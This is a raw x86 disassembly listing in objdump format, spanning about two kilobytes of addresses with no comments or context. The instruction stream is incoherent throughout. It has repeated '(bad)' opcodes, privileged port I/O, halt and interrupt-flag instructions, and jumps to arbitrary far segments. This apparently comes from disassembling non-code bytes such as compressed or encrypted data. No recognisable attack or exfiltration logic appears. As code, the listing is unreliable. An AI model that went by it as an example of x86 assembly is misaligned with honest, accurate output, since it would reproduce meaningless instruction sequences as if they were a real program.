  41d8e8:	push   DWORD PTR [edi*4-0x25436436]
  41d8ef:	jge    0x41d88d
  41d8f1:	dec    edx
  41d8f2:	dec    edx
  41d8f3:	(bad)  
  41d8f4:	sub    ah,bl
  41d8f6:	retf   
  41d8f7:	int3   
  41d8f8:	inc    esp
  41d8f9:	add    eax,0x447f8905
  41d8fe:	pop    ss
  41d8ff:	rol    esi,1
  41d901:	xor    eax,0x57e72c06
  41d906:	mov    BYTE PTR [edx-0x34],bl
  41d909:	mov    ebx,0x51d24eae
  41d90e:	fsubr  st,st(4)
  41d910:	jo     0x41d895
  41d912:	xchg   esi,eax
  41d913:	je     0x41d910
  41d915:	idiv   DWORD PTR [esi]
  41d917:	lds    edi,FWORD PTR [ebx]
  41d919:	sub    dl,BYTE PTR [esi+0x3b]
  41d91c:	pop    ebp
  41d91d:	sbb    eax,DWORD PTR [eax-0x286754e2]
  41d923:	fwait
  41d924:	mov    edx,0x3698b7ba
  41d929:	adc    DWORD PTR [esi],ebp
  41d92b:	fcom   DWORD PTR [ebx-0x1aa11015]
  41d931:	imul   BYTE PTR [ebx-0x9]
  41d934:	ss jl  0x41d926
  41d937:	shl    BYTE PTR [edi+ecx*8+0x6e],cl
  41d93b:	inc    ebp
  41d93c:	loopne 0x41d966
  41d93e:	lahf   
  41d93f:	cmp    dh,dl
  41d941:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d942:	(bad)  
  41d943:	push   ss
  41d944:	sti    
  41d945:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d946:	stos   BYTE PTR es:[edi],al
  41d947:	sbb    ah,BYTE PTR [esi+0x7]
  41d94a:	lahf   
  41d94b:	add    al,0x61
  41d94d:	adc    eax,0xf33b9fb0
  41d952:	sub    al,dh
  41d954:	icebp  
  41d955:	dec    edx
  41d956:	sub    bl,al
  41d958:	xchg   ebp,edi
  41d95a:	sbb    al,0x22
  41d95c:	fmul   QWORD PTR [ebp-0x67c766cb]
  41d962:	nop
  41d963:	les    edi,FWORD PTR [ecx+0x260890a7]
  41d969:	or     DWORD PTR [edi],edi
  41d96b:	jmp    0x51477930
  41d970:	sbb    al,0x94
  41d972:	push   eax
  41d973:	jl     0x41d9c9
  41d975:	jp     0x41d90f
  41d977:	add    ch,cl
  41d979:	pop    esp
  41d97a:	sub    eax,0x3e77bc34
  41d97f:	popf   
  41d980:	outs   dx,BYTE PTR ds:[esi]
  41d981:	sub    eax,DWORD PTR [eax+0x75]
  41d984:	jae    0x41d9d6
  41d986:	mov    ch,0x3a
  41d988:	std    
  41d989:	jae    0x41d96e
  41d98b:	push   edx
  41d98c:	sbb    ah,BYTE PTR [ebp+0x59]
  41d98f:	ret    
  41d990:	in     eax,0xf7
  41d992:	ret    0x4f5
  41d995:	shl    BYTE PTR ds:0xd78c1b62,1
  41d99b:	push   esp
  41d99c:	leave  
  41d99d:	fnstcw WORD PTR [ebp+0x6e]
  41d9a0:	sar    edx,0xa7
  41d9a3:	les    ecx,FWORD PTR [ebx-0x310e1816]
  41d9a9:	hlt    
  41d9aa:	lods   eax,DWORD PTR ds:[esi]
  41d9ab:	jmp    0xe9e6:0x3347fcef
  41d9b2:	xlat   BYTE PTR ds:[ebx]
  41d9b3:	pop    ss
  41d9b4:	cmp    DWORD PTR [edi+0x6a],edi
  41d9b7:	cli    
  41d9b8:	sub    eax,0x75e3c843
  41d9bd:	loope  0x41da31
  41d9bf:	cmc    
  41d9c0:	aad    0xce
  41d9c2:	mov    cl,0x11
  41d9c4:	push   edi
  41d9c5:	jecxz  0x41d9e9
  41d9c7:	arpl   WORD PTR [esi-0x2748c4a3],ax
  41d9cd:	retf   0xafe0
  41d9d0:	sub    DWORD PTR [eax],ebp
  41d9d2:	push   0xffffffe3
  41d9d4:	pop    esp
  41d9d5:	mov    eax,ds:0xe293c063
  41d9da:	add    al,0x4
  41d9dc:	mov    al,ds:0xd8b1a468
  41d9e1:	mov    ebp,0x82fd9949
  41d9e6:	adc    DWORD PTR [ebx-0x57],edx
  41d9e9:	retf   0xcbf0
  41d9ec:	loopne 0x41da0c
  41d9ee:	bound  ebx,QWORD PTR ds:0x9767183
  41d9f4:	in     eax,0xe9
  41d9f6:	adc    DWORD PTR [edx-0x56c1bafe],ebp
  41d9fc:	cmp    BYTE PTR [esi+0x1e],al
  41d9ff:	jae    0x41da0d
  41da01:	(bad)  
  41da02:	aad    0xcb
  41da04:	push   ecx
  41da05:	in     al,dx
  41da06:	or     eax,0x6a3a5fdc
  41da0b:	test   eax,0x99b70ae2
  41da10:	call   0x4799e1e8
  41da15:	mov    ebp,0xc1b85c31
  41da1a:	mov    bh,0xb8
  41da1c:	xor    DWORD PTR [ebp+0x72],ecx
  41da1f:	adc    DWORD PTR [esi+0x2c],ecx
  41da22:	push   edx
  41da23:	aas    
  41da24:	sub    BYTE PTR [esi-0x40],0xd5
  41da28:	push   esp
  41da29:	sub    eax,0x7216ba8a
  41da2e:	fidiv  WORD PTR [edi+ebx*2-0x1c]
  41da32:	mov    edx,0xf8afcfae
  41da37:	inc    ebp
  41da38:	ins    DWORD PTR es:[edi],dx
  41da39:	dec    esp
  41da3a:	push   cs
  41da3b:	dec    edi
  41da3c:	hlt    
  41da3d:	push   ds
  41da3e:	mov    dl,0x4c
  41da40:	adc    BYTE PTR [ecx-0x2d19de8f],al
  41da46:	call   0x97e801aa
  41da4b:	sub    eax,0x18b72df8
  41da50:	jmp    0x7234:0x35c51a19
  41da57:	outs   dx,BYTE PTR ds:[esi]
  41da59:	pop    edi
  41da5a:	inc    ebp
  41da5b:	pop    ss
  41da5c:	jp     0x41dac7
  41da5e:	jns    0x41da76
  41da60:	ror    DWORD PTR [ecx-0x6b0c070e],0x23
  41da67:	sub    eax,0x9114a48f
  41da6c:	cwde   
  41da6d:	xor    eax,0x4e0f23d5
  41da72:	retf   0x65b0
  41da75:	dec    edx
  41da76:	lahf   
  41da77:	mov    ecx,0x18436c49
  41da7c:	cld    
  41da7d:	cwde   
  41da7e:	xchg   esp,eax
  41da7f:	sub    eax,0xfe9ee532
  41da84:	iret   
  41da85:	pop    eax
  41da86:	stos   DWORD PTR es:[edi],eax
  41da87:	scas   al,BYTE PTR es:[edi]
  41da88:	mov    al,ds:0xacae5c71
  41da8d:	or     ebx,DWORD PTR [edi]
  41da8f:	mov    cl,0xc0
  41da91:	(bad)  
  41da92:	and    DWORD PTR [edi+0x4928b1ed],esi
  41da98:	xchg   ecx,eax
  41da99:	test   BYTE PTR [edi-0x3ace33a7],dh
  41da9f:	test   eax,0x239c913d
  41daa4:	dec    ecx
  41daa5:	out    dx,al
  41daa6:	jne    0x41db12
  41daa8:	add    eax,0x5ff4e95e
  41daad:	or     eax,0x7219af2a
  41dab2:	stos   BYTE PTR es:[edi],al
  41dab3:	ret    
  41dab4:	mov    eax,0xc2efb282
  41dab9:	push   ebp
  41daba:	sub    BYTE PTR [ebx-0x19],al
  41dabd:	dec    ebx
  41dabe:	mov    edi,0x41610773
  41dac3:	je     0x41dab5
  41dac5:	(bad)  
  41dac6:	push   ecx
  41dac7:	xor    edi,DWORD PTR [ebp+edx*2-0x7e6504bd]
  41dace:	mov    ebx,0x73aa3a2a
  41dad3:	cmp    DWORD PTR [esp+ebx*1-0xfddc2cc],ebp
  41dada:	popa   
  41dadb:	shr    BYTE PTR [ebp+0x78],0xc3
  41dadf:	js     0x41db1b
  41dae1:	xor    ebp,edx
  41dae3:	scas   eax,DWORD PTR es:[edi]
  41dae4:	dec    ebp
  41dae5:	cli    
  41dae6:	mov    ebp,0xbb1d2f52
  41daeb:	adc    DWORD PTR [eax+ebp*2-0x7cce18c2],ebx
  41daf2:	test   al,0x3f
  41daf4:	stos   DWORD PTR es:[edi],eax
  41daf5:	mov    bh,0x40
  41daf7:	xor    dh,dl
  41daf9:	lea    esi,[eax+0x78]
  41dafc:	lods   eax,DWORD PTR ds:[esi]
  41dafd:	out    0x1f,al
  41daff:	out    0x6f,eax
  41db01:	jo     0x41daa6
  41db03:	mov    cl,0xcd
  41db05:	popf   
  41db06:	push   edx
  41db07:	es (bad) 
  41db09:	nop
  41db0a:	imul   esi,edx,0x56544474
  41db10:	in     eax,0x45
  41db12:	ret    0xf641
  41db15:	iret   
  41db16:	mov    esi,0xf1b76593
  41db1b:	mov    ah,0xa1
  41db1d:	imul   edi,DWORD PTR [ecx+0x29c7db96],0xd425e2d4
  41db27:	leave  
  41db28:	jmp    0x41dac4
  41db2a:	gs xchg esp,eax
  41db2c:	mov    BYTE PTR [esi],0x49
  41db2f:	mov    WORD PTR [eax+eiz*8+0x1facc1a6],cs
  41db36:	(bad)  
  41db37:	out    dx,eax
  41db38:	fnsave [ebx]
  41db3a:	scas   al,BYTE PTR es:[edi]
  41db3b:	cdq    
  41db3c:	push   ebx
  41db3d:	fwait
  41db3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db3f:	jmp    0x28b1b5e2
  41db44:	ds inc edi
  41db46:	inc    edi
  41db47:	jl     0x41dafc
  41db49:	ja     0x41db57
  41db4b:	loopne 0x41db3e
  41db4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db4e:	fsubr  st(0),st
  41db50:	out    0x6d,al
  41db52:	pop    esi
  41db53:	in     eax,dx
  41db54:	xlat   BYTE PTR ds:[ebx]
  41db55:	iret   
  41db56:	fbstp  TBYTE PTR [ebp-0x4421fdd2]
  41db5c:	jp     0x41db5c
  41db5e:	mov    ch,0x52
  41db60:	inc    esp
  41db61:	into   
  41db62:	xor    dl,BYTE PTR [eax-0x4b47bf3d]
  41db68:	push   esp
  41db69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db6a:	repnz loopne 0x41dbdb
  41db6d:	adc    BYTE PTR [esi],0xd0
  41db70:	retf   
  41db71:	arpl   WORD PTR [eax+0x77ede5b3],bx
  41db77:	pop    esp
  41db78:	or     eax,0x8d753798
  41db7d:	xchg   edx,eax
  41db7e:	sub    DWORD PTR [ebp-0x398d1c54],ecx
  41db84:	xor    BYTE PTR [ecx-0xc146b1d],ah
  41db8a:	adc    DWORD PTR [edx+0x1a],0x59
  41db8e:	xchg   ebp,eax
  41db8f:	jnp    0x41dbe0
  41db91:	jae    0x41dbd1
  41db93:	out    dx,eax
  41db94:	loopne 0x41dc11
  41db96:	jmp    0xb878:0x80593876
  41db9d:	pop    edi
  41db9e:	add    al,0xca
  41dba0:	jno    0x41dbff
  41dba2:	jmp    0x56f7:0x3e5bd8ca
  41dba9:	xchg   esp,eax
  41dbaa:	outs   dx,BYTE PTR ds:[esi]
  41dbab:	js     0x41db7e
  41dbad:	and    eax,0x7fcc9aa
  41dbb2:	pop    ebx
  41dbb3:	ds inc eax
  41dbb5:	jmp    0xedab7196
  41dbba:	(bad)  
  41dbbb:	push   cs
  41dbbc:	and    dh,BYTE PTR [ebx-0x2673cd88]
  41dbc2:	int    0x48
  41dbc4:	and    ch,BYTE PTR [ebx+0x4c51c40f]
  41dbca:	pop    esp
  41dbcb:	lds    ebx,FWORD PTR [ebp-0x6e7663d0]
  41dbd1:	xchg   esi,eax
  41dbd2:	mov    esi,0xc1e9bfc4
  41dbd7:	(bad)  
  41dbd8:	mov    dl,0xc3
  41dbda:	cs test al,0x38
  41dbdd:	test   edx,esi
  41dbdf:	not    BYTE PTR [ebp+0xc0fdbd3]
  41dbe5:	sub    BYTE PTR [ebx+0x17cf97eb],bh
  41dbeb:	mov    cl,0x27
  41dbed:	repz repnz and BYTE PTR [ecx],cl
  41dbf1:	daa    
  41dbf2:	(bad)  
  41dbf3:	mul    cl
  41dbf5:	inc    eax
  41dbf6:	jecxz  0x41db94
  41dbf8:	(bad)  
  41dbf9:	add    ch,BYTE PTR [ebp+0x84b08a1]
  41dbff:	xchg   esp,eax
  41dc00:	ficomp DWORD PTR [edi-0x42]
  41dc03:	push   cs
  41dc04:	test   eax,0x5456a28f
  41dc09:	inc    ebp
  41dc0a:	popf   
  41dc0b:	lods   eax,DWORD PTR ds:[esi]
  41dc0c:	sbb    ebx,esi
  41dc0e:	aam    0xc5
  41dc10:	(bad)  
  41dc11:	push   edi
  41dc12:	aaa    
  41dc13:	data16 fidivr DWORD PTR [esp+ebp*1-0x58]
  41dc18:	mov    bl,0x4c
  41dc1a:	dec    edi
  41dc1b:	(bad)  
  41dc1c:	sbb    BYTE PTR [edx+0xa765ef1],al
  41dc22:	es dec esi
  41dc24:	rol    DWORD PTR [eax],cl
  41dc26:	add    DWORD PTR [esi+0x3ab20673],eax
  41dc2c:	or     BYTE PTR [eax+eiz*8-0x7c75c59b],ah
  41dc33:	mov    ch,0x87
  41dc35:	hlt    
  41dc36:	sbb    ah,BYTE PTR [ecx]
  41dc38:	mov    ebp,0x79156002
  41dc3d:	fistp  WORD PTR [ecx+0x2e]
  41dc40:	push   ebp
  41dc41:	add    bh,al
  41dc43:	popa   
  41dc44:	mov    ecx,0xaa3e2c7f
  41dc49:	or     eax,0xb98eb093
  41dc4e:	out    dx,eax
  41dc4f:	mov    eax,0x49433700
  41dc54:	jno    0x41dbf4
  41dc56:	mov    edi,0x3392eddb
  41dc5b:	and    al,0x54
  41dc5d:	xor    BYTE PTR [edx],ah
  41dc5f:	add    bh,BYTE PTR [edx+0x567965e7]
  41dc65:	mov    bl,0x6e
  41dc67:	jmp    0x41dbf2
  41dc69:	loope  0x41dcd3
  41dc6b:	(bad)  
  41dc6c:	lea    esp,[ecx-0x7a]
  41dc6f:	adc    al,0x1f
  41dc71:	dec    ebp
  41dc72:	push   edi
  41dc73:	add    ah,BYTE PTR [ecx+0x53]
  41dc76:	mov    eax,ds:0x3e7f7f23
  41dc7b:	pop    edx
  41dc7c:	add    al,0x3f
  41dc7e:	repz mov edx,0xdee40ff6
  41dc84:	push   eax
  41dc85:	in     eax,0x87
  41dc87:	add    al,0xa9
  41dc89:	adc    eax,DWORD PTR [esi-0x78]
  41dc8c:	jp     0x41dc4d
  41dc8e:	imul   ebx,DWORD PTR [ecx],0x25
  41dc91:	pop    esp
  41dc92:	std    
  41dc93:	mov    ch,0xe9
  41dc95:	loop   0x41dcfb
  41dc97:	pop    ss
  41dc98:	das    
  41dc99:	sbb    DWORD PTR [ebx-0x209b7bf8],0xfffffff0
  41dca0:	add    al,0x7b
  41dca2:	cmp    eax,0xdc76a612
  41dca7:	stc    
  41dca8:	jp     0x41dc84
  41dcaa:	inc    ecx
  41dcab:	xchg   edx,eax
  41dcac:	add    al,0x81
  41dcae:	shl    edx,0x73
  41dcb1:	pushf  
  41dcb2:	es pusha 
  41dcb4:	iret   
  41dcb5:	test   DWORD PTR [edx-0x7e0adf14],esi
  41dcbb:	inc    esi
  41dcbc:	fcom   QWORD PTR [ebp+0x79]
  41dcbf:	push   es
  41dcc0:	pop    eax
  41dcc1:	inc    ecx
  41dcc2:	lea    esp,[ecx]
  41dcc4:	inc    esp
  41dcc5:	and    al,0x2
  41dcc7:	outs   dx,DWORD PTR ds:[esi]
  41dcc8:	adc    ch,ch
  41dcca:	push   edx
  41dccb:	jmp    0x748a36c5
  41dcd0:	dec    ebx
  41dcd1:	cmp    al,0xbb
  41dcd3:	fwait
  41dcd4:	xor    eax,0xb25fabfa
  41dcd9:	shr    BYTE PTR [ecx-0x1bd930c6],1
  41dcdf:	fs push 0x7f26ceb
  41dce5:	xchg   esi,eax
  41dce6:	inc    ebp
  41dce7:	sbb    dl,cl
  41dce9:	cli    
  41dcea:	push   ds
  41dceb:	fucomip st,st(3)
  41dced:	inc    BYTE PTR [esi-0x75]
  41dcf0:	fisttp QWORD PTR [ebx-0x6c86c376]
  41dcf6:	push   ds
  41dcf7:	xchg   edi,eax
  41dcf8:	fwait
  41dcf9:	outs   dx,DWORD PTR ds:[esi]
  41dcfa:	inc    eax
  41dcfb:	in     al,dx
  41dcfc:	xchg   ecx,eax
  41dcfd:	sahf   
  41dcfe:	ja     0x41dd1f
  41dd00:	fld    TBYTE PTR [eax]
  41dd02:	cmp    BYTE PTR ds:0xd44cbd60,bh
  41dd08:	xchg   BYTE PTR [eax-0x139453b2],dl
  41dd0e:	std    
  41dd0f:	lea    esp,[esi-0x25]
  41dd12:	in     eax,dx
  41dd13:	imul   edx,ebx,0xffffffb4
  41dd16:	jp     0x41dca7
  41dd18:	add    BYTE PTR [edx+edx*1],ch
  41dd1b:	mov    WORD PTR [ebx],fs
  41dd1d:	cs pop ss
  41dd1f:	xlat   BYTE PTR ds:[ebx]
  41dd20:	pop    ebx
  41dd21:	loopne 0x41dcbb
  41dd23:	cmc    
  41dd24:	inc    ecx
  41dd25:	(bad)  
  41dd26:	bound  esi,QWORD PTR [esi]
  41dd28:	push   esi
  41dd29:	adc    al,ah
  41dd2b:	pop    ebp
  41dd2c:	and    al,0x3d
  41dd2e:	mov    edx,0x121e9f9b
  41dd33:	loope  0x41dd5f
  41dd35:	and    al,BYTE PTR [eax+0x1a]
  41dd38:	add    al,0x8a
  41dd3a:	gs (bad) 
  41dd3c:	div    dl
  41dd3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd3f:	push   edx
  41dd40:	test   eax,0x2442fa90
  41dd45:	pop    esp
  41dd46:	rol    DWORD PTR [edx-0xb],0xf5
  41dd4a:	or     ecx,DWORD PTR [edi]
  41dd4c:	mov    ebp,0x7f0e8253
  41dd51:	scas   ax,WORD PTR es:[edi]
  41dd53:	ins    BYTE PTR es:[edi],dx
  41dd54:	and    DWORD PTR [ebx+eiz*2],ebx
  41dd57:	and    cl,cl
  41dd59:	or     eax,0xd8267f11
  41dd5e:	or     eax,0x7f08aee0
  41dd63:	jp     0x41dd86
  41dd65:	jae    0x41dddc
  41dd67:	xor    DWORD PTR [ecx-0x63c39342],edx
  41dd6d:	jecxz  0x41ddd3
  41dd6f:	push   ds
  41dd70:	jno    0x41dd94
  41dd72:	sbb    BYTE PTR ds:0x4446c444,bl
  41dd78:	add    DWORD PTR [edx+esi*1],edi
  41dd7b:	inc    esp
  41dd7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd7d:	lea    ebp,[edx+0x21577e80]
  41dd83:	add    eax,0x19e96764
  41dd88:	(bad)  
  41dd89:	popa   
  41dd8a:	dec    ecx
  41dd8b:	jb     0x41dd81
  41dd8d:	push   ss
  41dd8e:	xchg   esi,eax
  41dd8f:	fiadd  DWORD PTR [ecx+ebp*8]
  41dd92:	imul   esi,ecx,0xee128e2e
  41dd98:	out    0xb6,al
  41dd9a:	sbb    al,BYTE PTR [esi+ecx*8+0x24414add]
  41dda1:	mov    esp,0xa833d0ea
  41dda6:	out    0x38,al
  41dda8:	mov    cl,0xa3
  41ddaa:	mov    al,0x62
  41ddac:	nop
  41ddad:	cmc    
  41ddae:	cmp    al,0xfa
  41ddb1:	pop    ebx
  41ddb2:	arpl   WORD PTR [edx+0x776db09f],bp
  41ddb8:	mov    ds:0x8f6c3a6e,al
  41ddbd:	jge    0x41de17
  41ddbf:	cmc    
  41ddc0:	jo     0x41dd61
  41ddc2:	rcl    DWORD PTR [esi-0x34],1
  41ddc5:	(bad)  
  41ddc6:	stc    
  41ddc7:	std    
  41ddc8:	and    al,0x34
  41ddca:	push   0xdfce414d
  41ddcf:	stc    
  41ddd0:	mov    ecx,0xfcd4023b
  41ddd5:	imul   ebx,DWORD PTR [ecx],0x7e
  41ddd8:	mov    ch,0x92
  41ddda:	pop    ss
  41dddb:	stos   DWORD PTR es:[edi],eax
  41dddc:	rcr    DWORD PTR [eax+0x53adb059],1
  41dde2:	aaa    
  41dde3:	sti    
  41dde4:	outs   dx,DWORD PTR ds:[esi]
  41dde5:	jg     0x41dda4
  41dde7:	xor    eax,DWORD PTR [eax]
  41dde9:	fwait
  41ddea:	sub    al,dl
  41ddec:	fsubr  QWORD PTR gs:[ecx+eax*8-0x352c77b8]
  41ddf4:	jnp    0x41de0c
  41ddf6:	adc    al,0x9a
  41ddf8:	xor    DWORD PTR [edi+0x62fa4389],0x8cc97d2
  41de02:	mov    ds:0xfce0a98,eax
  41de07:	mov    esi,0xb584a960
  41de0c:	push   es
  41de0d:	xchg   DWORD PTR [ebx+ecx*8-0x9],ebp
  41de11:	xchg   edx,eax
  41de12:	ins    DWORD PTR es:[edi],dx
  41de13:	cmp    esi,DWORD PTR [edi]
  41de15:	(bad)  
  41de16:	jmp    0xb397:0xb6f244c8
  41de1d:	in     al,dx
  41de1e:	push   cs
  41de1f:	es rcl cl,cl
  41de22:	js     0x41ddef
  41de24:	dec    eax
  41de25:	mov    ds:0x68f47bbc,al
  41de2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de2b:	inc    eax
  41de2c:	mov    eax,0x43587640
  41de31:	cmp    eax,0x980d5a56
  41de36:	inc    esp
  41de37:	loopne 0x41de5b
  41de39:	pop    edx
  41de3a:	test   BYTE PTR ds:0x2700,al
  41de3f:	or     ecx,DWORD PTR [eax]
  41de41:	out    dx,al
  41de42:	cmp    eax,0xde094433
  41de47:	mov    ebx,0x42332cf5
  41de4c:	dec    edi
  41de4d:	nop
  41de4e:	sub    al,BYTE PTR [esi+edi*1]
  41de51:	nop
  41de52:	sub    al,0x8a
  41de54:	push   edi
  41de55:	inc    esi
  41de56:	sbb    BYTE PTR [edi-0x4e],bl
  41de59:	fwait
  41de5a:	rcr    BYTE PTR [esi-0xc4cb78e],1
  41de60:	dec    ebp
  41de61:	shr    BYTE PTR [ecx-0x7c],cl
  41de64:	inc    ebp
  41de65:	add    ah,ah
  41de67:	lods   eax,DWORD PTR ds:[esi]
  41de68:	addr16 inc ecx
  41de6a:	dec    ebx
  41de6b:	iret   
  41de6c:	imul   esi,DWORD PTR [eax+0x30],0xcc5b77f5
  41de73:	jne    0x41de43
  41de75:	rcl    DWORD PTR [edi],0x17
  41de78:	dec    ebp
  41de79:	mov    edi,0x910107cf
  41de7e:	nop
  41de7f:	cmp    eax,0x63469ba0
  41de84:	xchg   ebp,eax
  41de85:	mov    dl,0xe3
  41de87:	retf   
  41de88:	mov    ch,0x1c
  41de8a:	fstp   DWORD PTR [edi]
  41de8c:	add    al,0x63
  41de8e:	imul   ebx,DWORD PTR [esi-0x77],0x454dbb8f
  41de95:	mov    al,gs:0x10a5dd48
  41de9b:	push   ebx
  41de9c:	test   al,0x2c
  41de9e:	and    eax,DWORD PTR [ecx-0x3d]
  41dea1:	jmp    FWORD PTR [ebx-0x58]
  41dea4:	pushf  
  41dea5:	popa   
  41dea6:	and    al,0xbb
  41dea8:	mov    edx,0xb4ec3518
  41dead:	adc    al,0x81
  41deaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41deb0:	dec    ebx
  41deb1:	inc    edi
  41deb2:	scas   al,BYTE PTR es:[edi]
  41deb3:	dec    esi
  41deb4:	fsub   QWORD PTR [esi-0x30]
  41deb7:	retf   0xdf3b
  41deba:	fbstp  TBYTE PTR [eax]
  41debc:	jnp    0x41df39
  41debe:	ror    BYTE PTR [eax-0x78],cl
  41dec1:	out    0xcc,al
  41dec3:	mov    eax,0x3a14eccb
  41dec8:	add    eax,0x55950aca
  41decd:	ja     0x41dec2
  41decf:	sub    eax,0x314a1d0a
  41ded4:	pusha  
  41ded5:	mov    ch,0x31
  41ded7:	or     esi,DWORD PTR ds:0xdedb59
  41dedd:	sub    al,0x6c
  41dedf:	inc    ebx
  41dee0:	mov    ch,0x3e
  41dee2:	bound  ecx,QWORD PTR [ebx-0x63]
  41dee5:	jne    0x41dee6
  41dee7:	and    al,0x3a
  41dee9:	jno    0x41de76
  41deeb:	jge    0x41de84
  41deed:	pop    eax
  41deee:	xor    edi,ecx
  41def0:	inc    esp
  41def1:	xchg   edx,eax
  41def2:	(bad)  [eax+0x79]
  41def5:	mov    edi,0x7d39f789
  41defa:	cmp    ebx,edi
  41defc:	out    dx,eax
  41defd:	xor    al,0x84
  41deff:	ins    DWORD PTR es:[edi],dx
  41df00:	push   eax
  41df01:	lods   al,BYTE PTR ds:[esi]
  41df02:	ror    BYTE PTR [ebx],cl
  41df04:	(bad)  
  41df06:	popa   
  41df07:	ret    
  41df08:	call   0x4c41:0xb7b4b3cf
  41df0f:	cmp    BYTE PTR [ebp+0x2d],0x98
  41df13:	in     eax,dx
  41df14:	or     al,0xbd
  41df16:	push   0x2e
  41df18:	jae    0x41dea7
  41df1a:	es iret 
  41df1c:	icebp  
  41df1d:	dec    edi
  41df1e:	test   DWORD PTR [ecx-0x3f],esp
  41df21:	cmp    esp,edi
  41df23:	or     al,0x58
  41df25:	fdivr  DWORD PTR [bx+di+0x5f8c]
  41df2a:	jbe    0x41df15
  41df2c:	pop    ecx
  41df2d:	(bad)  
  41df2e:	xchg   ebp,eax
  41df2f:	pop    ds
  41df30:	int    0x64
  41df32:	jge    0x41df6f
  41df34:	xchg   DWORD PTR [edx],ebx
  41df36:	fiadd  WORD PTR [edx-0x3a]
  41df39:	sub    al,0x5b
  41df3b:	outs   dx,DWORD PTR ds:[esi]
  41df3c:	cdq    
  41df3d:	and    al,0x88
  41df3f:	das    
  41df40:	xchg   ebx,eax
  41df41:	pop    edi
  41df42:	push   ebp
  41df43:	cmp    al,0x7f
  41df45:	fs cs push edx
  41df48:	enter  0xeeb6,0x79
  41df4c:	sbb    eax,0x218bb64e
  41df51:	mov    edx,0xc1c876f8
  41df56:	sub    DWORD PTR [eax+0x6850b784],ebx
  41df5c:	jge    0x41df5b
  41df5e:	xchg   edx,eax
  41df5f:	add    eax,0xa5c9c1c2
  41df64:	sbb    ecx,DWORD PTR [edi+0x20a289f8]
  41df6a:	pop    eax
  41df6b:	mov    ebp,0x98d37179
  41df70:	push   ss
  41df71:	scas   eax,DWORD PTR es:[edi]
  41df72:	pop    edi
  41df73:	leave  
  41df74:	ret    
  41df75:	or     ebp,DWORD PTR [ebx+0x61]
  41df78:	inc    edi
  41df79:	fild   WORD PTR ds:0x5dfd1492
  41df7f:	(bad)  
  41df80:	mov    DWORD PTR [ecx+0x49853afe],0x6a6b4216
  41df8a:	les    ebp,FWORD PTR [ecx-0x75fe2ecc]
  41df90:	add    ecx,DWORD PTR [eax]
  41df92:	sub    BYTE PTR [eax+0xb],ah
  41df95:	aaa    
  41df96:	das    
  41df97:	sti    
  41df98:	xor    BYTE PTR [esi],al
  41df9a:	mov    dh,0x74
  41df9c:	test   DWORD PTR [ebx-0x4b],esi
  41df9f:	test   al,0x22
  41dfa1:	cmp    DWORD PTR [eax],0x10
  41dfa4:	xor    BYTE PTR [edx+0x26725ad8],ah
  41dfaa:	outs   dx,DWORD PTR ds:[esi]
  41dfab:	jbe    0x41e028
  41dfad:	shld   DWORD PTR [ecx+0xde777b4],eax,0xa3
  41dfb5:	(bad)
  41dfb8:	idiv   BYTE PTR [ebp+0x77]
  41dfbb:	ret    
  41dfbc:	fsub   QWORD PTR ds:0xf395aaa0
  41dfc2:	sbb    edi,edi
  41dfc4:	sbb    esi,ecx
  41dfc6:	std    
  41dfc7:	aaa    
  41dfc8:	inc    eax
  41dfc9:	icebp  
  41dfca:	mov    ah,0x2e
  41dfcc:	lods   eax,DWORD PTR ds:[esi]
  41dfcd:	(bad)  
  41dfce:	stc    
  41dfcf:	fwait
  41dfd0:	jnp    0x41dff8
  41dfd2:	lock mov DWORD PTR [ecx],ecx
  41dfd5:	adc    esp,DWORD PTR [ecx]
  41dfd7:	jbe    0x41df9e
  41dfd9:	std    
  41dfda:	mov    ebx,0x380189fc
  41dfdf:	loope  0x41dffa
  41dfe1:	mov    ds:0x6a7269ac,eax
  41dfe6:	(bad)  
  41dfe7:	fsubr  DWORD PTR [ebp-0x35]
  41dfea:	and    cl,BYTE PTR [esi-0x2d6e5b4]
  41dff0:	sahf   
  41dff1:	arpl   bx,di
  41dff3:	loop   0x41e061
  41dff5:	shl    esp,1
  41dff7:	jns    0x41df89
  41dff9:	and    eax,0xa437a2d6
  41dffe:	adc    DWORD PTR [ebp+0x7a2bd4ef],esi
  41e004:	sub    BYTE PTR [edi-0x50],bh
  41e007:	mov    dh,0xe0
  41e009:	into   
  41e00a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e00b:	leave  
  41e00c:	hlt    
  41e00d:	shr    BYTE PTR [esi+edx*4],0xa1
  41e011:	ud0    esp,DWORD PTR [ebx-0x1764347d]
  41e018:	int3   
  41e019:	push   ebx
  41e01a:	imul   ebx,DWORD PTR [ecx],0xffffff85
  41e01d:	and    al,0xd
  41e01f:	mov    eax,0xc3515062
  41e024:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e025:	xor    edi,DWORD PTR [ebx-0x4a]
  41e028:	nop
  41e029:	lock lds eax,FWORD PTR [ecx-0x2b]
  41e02d:	add    bl,BYTE PTR [ecx-0x6ae85776]
  41e033:	and    ecx,DWORD PTR [ecx+0x10888aaa]
  41e039:	call   0x35cc3691
  41e03e:	rcl    BYTE PTR [ecx+0x3a],cl
  41e041:	push   edi
  41e042:	pop    esi
  41e043:	test   eax,0x8783d182
  41e048:	fidivr WORD PTR [eax]
  41e04a:	or     eax,ebx
  41e04c:	xchg   ecx,eax
  41e04d:	pop    ss
  41e04e:	xchg   esi,eax
  41e04f:	ins    BYTE PTR es:[edi],dx
  41e050:	mov    edx,0x114f01c6
  41e055:	sbb    DWORD PTR es:[ebx-0x6c70ae04],ebx
  41e05c:	pop    ebp
  41e05d:	js     0x41e09c
  41e05f:	mov    al,0x53
  41e061:	push   esp
  41e062:	dec    edx
  41e063:	and    al,0xea
  41e065:	mov    edx,0xb4503fac
  41e06a:	dec    ebx
  41e06b:	xchg   edx,eax
  41e06c:	mov    edi,0xbe2589c8
  41e071:	hlt    
  41e072:	dec    eax
  41e073:	xchg   ebx,eax
